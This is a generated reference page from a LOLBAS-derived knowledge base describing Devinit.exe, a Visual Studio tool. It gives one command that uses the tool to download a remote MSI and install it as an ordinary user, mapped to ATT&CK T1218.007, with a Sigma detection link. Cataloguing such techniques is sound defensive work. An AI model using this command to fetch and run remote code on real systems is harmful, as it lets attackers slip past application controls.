---
title: "Devinit.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OtherMSBinaries/Devinit.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Devinit.yml"
build_date: "2026-04-27 19:14:21"
category: "OtherMSBinaries"
aliases:
  - "Devinit.exe"
functions:
  - "Execute"
attack_technique_ids:
  - "T1218.007"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Visual Studio 2019 tool

## Paths

- `C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\Tools\devinit\devinit.exe`
- `C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\Tools\devinit\devinit.exe`

## Commands

### 1. Execute

Downloads an MSI file to C:\Windows\Installer and then installs it.

```cmd
devinit.exe run -t msi-install -i {REMOTEURL:.msi}
```

- Use Case: Executes code from a (remote) MSI file.
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218007-msiexec|T1218.007: Msiexec]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_devinit_lolbin_usage.yml

## Resources

- {'Link': 'https://twitter.com/mrd0x/status/1460815932402679809'}

## Acknowledgements

- {'Person': 'mr.d0x', 'Handle': '@mrd0x'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Devinit.yml)
